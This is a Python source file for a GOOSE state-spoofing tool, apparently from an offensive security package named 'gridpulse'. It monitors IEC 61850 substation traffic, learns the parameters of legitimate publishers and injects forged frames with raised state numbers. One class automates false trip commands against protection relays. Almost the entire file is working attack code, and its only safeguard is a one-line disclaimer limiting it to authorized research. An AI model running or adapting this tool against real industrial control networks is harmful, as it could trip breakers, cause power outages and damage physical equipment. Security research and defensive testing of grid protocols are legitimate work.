"""
GOOSE State Spoofing Tool
==========================

Injects GOOSE frames with forged state numbers (stNum/sqNum) to
override legitimate publisher state on the network. Implements
trip command injection and race condition attacks.

Attack Flow:
    1. Monitor network for legitimate GOOSE traffic from target publisher
    2. Learn the publisher's gocbRef, datSet, goID, confRev, stNum/sqNum
    3. Inject spoofed frames with higher stNum to take priority
    4. Optionally inject false trip commands (Boolean True in allData)

Per IEC 61850, receiving IEDs accept the frame with the highest
stNum as the current state. An attacker who injects a frame with
stNum > legitimate_stNum will override the legitimate publisher.

Platform: Linux only
MITRE ATT&CK for ICS: T0855, T0831

⚠️  For authorized security research on isolated test networks only.
"""

from __future__ import annotations

import os
import struct
import time
import threading
from dataclasses import dataclass, field
from typing import Optional

from gridpulse.protocols.goose import GOOSEFrame
from gridpulse.attacks.goose_inject import GOOSEInjector, GOOSEListener, InjectionStats


# ============================================================================
# Publisher State Tracker
# ============================================================================

@dataclass
class PublisherState:
    """Tracked state of a legitimate GOOSE publisher."""
    source_mac: str
    gocb_ref: str = ""
    dat_set: str = ""
    go_id: str = ""
    conf_rev: int = 0
    last_st_num: int = 0
    last_sq_num: int = 0
    frame_count: int = 0
    last_seen: float = 0.0
    last_frame: Optional[GOOSEFrame] = None

    def update(self, frame: GOOSEFrame) -> None:
        """Update tracked state from an observed frame."""
        self.frame_count += 1
        self.last_seen = time.monotonic()
        self.last_frame = frame
        if hasattr(frame, 'pdu') and frame.pdu:
            pdu = frame.pdu
            if hasattr(pdu, 'gocb_ref') and pdu.gocb_ref:
                self.gocb_ref = pdu.gocb_ref
            if hasattr(pdu, 'dat_set') and pdu.dat_set:
                self.dat_set = pdu.dat_set
            if hasattr(pdu, 'go_id') and pdu.go_id:
                self.go_id = pdu.go_id
            if hasattr(pdu, 'conf_rev'):
                self.conf_rev = pdu.conf_rev
            if hasattr(pdu, 'st_num'):
                self.last_st_num = pdu.st_num
            if hasattr(pdu, 'sq_num'):
                self.last_sq_num = pdu.sq_num

    def __str__(self) -> str:
        return (
            f"Publisher({self.source_mac}): "
            f"stNum={self.last_st_num}, sqNum={self.last_sq_num}, "
            f"gocbRef={self.gocb_ref}, frames={self.frame_count}"
        )


# ============================================================================
# GOOSE Spoof Attack
# ============================================================================

class GOOSESpoofAttack:
    """
    GOOSE state spoofing attack.

    Monitors legitimate GOOSE traffic, learns publisher state,
    and injects spoofed frames with higher stNum to override
    legitimate state.
    """

    def __init__(self, interface: str, target_mac: Optional[str] = None):
        """
        Args:
            interface: Network interface to monitor and inject on
            target_mac: Specific publisher MAC to target (None = first seen)
        """
        self._interface = interface
        self._target_mac = target_mac
        self._publishers: dict[str, PublisherState] = {}
        self._running = False
        self._stop_event = threading.Event()

    def monitor(
        self,
        duration: float = 10.0,
        callback=None,
    ) -> dict[str, PublisherState]:
        """
        Monitor network for GOOSE publishers.

        Args:
            duration: How long to monitor (seconds)
            callback: Optional callback(PublisherState) on each update

        Returns:
            Dict of MAC -> PublisherState
        """
        listener = GOOSEListener(self._interface)
        start = time.monotonic()

        try:
            while time.monotonic() - start < duration:
                raw = listener.recv_frame(timeout=1.0)
                if raw is None:
                    continue

                try:
                    frame = GOOSEFrame.parse(raw)
                except Exception:
                    continue

                # Extract source MAC
                src_mac = ":".join(f"{b:02x}" for b in raw[6:12])

                if src_mac not in self._publishers:
                    self._publishers[src_mac] = PublisherState(source_mac=src_mac)

                self._publishers[src_mac].update(frame)

                if callback:
                    callback(self._publishers[src_mac])

        finally:
            listener.close()

        return self._publishers

    def spoof_state(
        self,
        publisher: PublisherState,
        st_num_advance: int = 10,
        inject_trip: bool = False,
        count: int = 1,
    ) -> InjectionStats:
        """
        Inject spoofed GOOSE frames with advanced stNum.

        Args:
            publisher: Target publisher state (from monitor())
            st_num_advance: How far ahead to set stNum
            inject_trip: If True, set Boolean allData to True (trip command)
            count: Number of spoofed frames to inject

        Returns:
            InjectionStats
        """
        if publisher.last_frame is None:
            raise ValueError("No observed frame from publisher to base spoof on")

        injector = GOOSEInjector(self._interface)
        stats = InjectionStats(start_time=time.monotonic())

        try:
            for i in range(count):
                spoofed = self._build_spoof_frame(
                    publisher=publisher,
                    st_num=publisher.last_st_num + st_num_advance + i,
                    sq_num=0,  # Reset sqNum on state change
                    trip_value=inject_trip,
                )

                try:
                    sent = injector.send_frame(spoofed)
                    stats.packets_sent += 1
                    stats.bytes_sent += sent
                except OSError:
                    stats.errors += 1

                stats.last_send_time = time.monotonic()

        finally:
            injector.close()

        return stats

    def _build_spoof_frame(
        self,
        publisher: PublisherState,
        st_num: int,
        sq_num: int,
        trip_value: bool = False,
    ) -> bytes:
        """Build a spoofed GOOSE frame based on observed publisher state."""
        # Use the publisher's MAC and settings
        src_mac = bytes(int(b, 16) for b in publisher.source_mac.split(":"))
        dst_mac = bytes([0x01, 0x0C, 0xCD, 0x01, 0x00, 0x01])

        # Build GOOSE PDU
        pdu_fields = b""
        pdu_fields += self._ber_tlv(0x80, publisher.gocb_ref.encode())
        pdu_fields += self._ber_tlv(0x81, self._encode_int(2000))
        pdu_fields += self._ber_tlv(0x82, publisher.dat_set.encode())
        pdu_fields += self._ber_tlv(0x83, publisher.go_id.encode())

        # Current timestamp
        now = time.time()
        t_sec = int(now)
        t_frac = int((now % 1) * 0xFFFFFF)
        pdu_fields += self._ber_tlv(0x84, struct.pack(">I", t_sec) +
                                     struct.pack(">I", (t_frac << 8)))

        pdu_fields += self._ber_tlv(0x85, self._encode_int(st_num))
        pdu_fields += self._ber_tlv(0x86, self._encode_int(sq_num))
        pdu_fields += self._ber_tlv(0x87, b"\x00")      # simulation=False
        pdu_fields += self._ber_tlv(0x88, self._encode_int(publisher.conf_rev))
        pdu_fields += self._ber_tlv(0x89, b"\x00")
        pdu_fields += self._ber_tlv(0x8A, self._encode_int(1))

        # allData: Boolean with trip value
        trip_byte = b"\xFF" if trip_value else b"\x00"
        all_data = self._ber_tlv(0x83, trip_byte)
        pdu_fields += self._ber_tlv(0xAB, all_data)

        goose_pdu = self._ber_tlv(0x61, pdu_fields)

        # GOOSE header
        apdu_len = 8 + len(goose_pdu)
        goose_header = struct.pack(">HHHH", 0x0001, apdu_len, 0, 0)

        # Ethernet header
        eth_header = dst_mac + src_mac + struct.pack(">H", 0x88B8)

        return eth_header + goose_header + goose_pdu

    @staticmethod
    def _ber_tlv(tag: int, value: bytes) -> bytes:
        length = len(value)
        if length < 0x80:
            return bytes([tag, length]) + value
        elif length < 0x100:
            return bytes([tag, 0x81, length]) + value
        else:
            return bytes([tag, 0x82]) + struct.pack(">H", length) + value

    @staticmethod
    def _encode_int(value: int) -> bytes:
        if value == 0:
            return b"\x00"
        result = []
        v = value
        while v > 0:
            result.insert(0, v & 0xFF)
            v >>= 8
        if result[0] & 0x80:
            result.insert(0, 0)
        return bytes(result)


# ============================================================================
# Trip Injector (specialized spoofing for trip commands)
# ============================================================================

class TripInjector:
    """
    Specialized tool for injecting false trip commands.

    Monitors for a specific publisher, learns its state, and
    injects a spoofed GOOSE trip command (Boolean True) with
    a higher stNum to override legitimate protection state.
    """

    def __init__(self, interface: str):
        self._interface = interface
        self._spoof = GOOSESpoofAttack(interface)

    def auto_trip(
        self,
        monitor_duration: float = 5.0,
        target_mac: Optional[str] = None,
        st_advance: int = 100,
    ) -> InjectionStats:
        """
        Automatically monitor, learn, and inject a trip command.

        Args:
            monitor_duration: How long to observe traffic
            target_mac: Specific publisher to target
            st_advance: How far to advance stNum

        Returns:
            InjectionStats
        """
        # Phase 1: Monitor
        publishers = self._spoof.monitor(duration=monitor_duration)

        if not publishers:
            raise RuntimeError("No GOOSE publishers detected on the network")

        # Select target
        if target_mac:
            if target_mac not in publishers:
                raise ValueError(f"Target MAC {target_mac} not found. "
                               f"Seen: {list(publishers.keys())}")
            target = publishers[target_mac]
        else:
            # Use the most active publisher
            target = max(publishers.values(), key=lambda p: p.frame_count)

        # Phase 2: Inject trip
        return self._spoof.spoof_state(
            publisher=target,
            st_num_advance=st_advance,
            inject_trip=True,
            count=5,  # Send multiple for reliability
        )


if __name__ == "__main__":
    print("GridPulse GOOSE Spoofing Tool")
    print("=" * 50)
    print()
    print("Modes:")
    print("  1. Monitor:  Discover GOOSE publishers on the network")
    print("  2. Spoof:    Inject frames with forged stNum")
    print("  3. Trip:     Inject false trip commands")
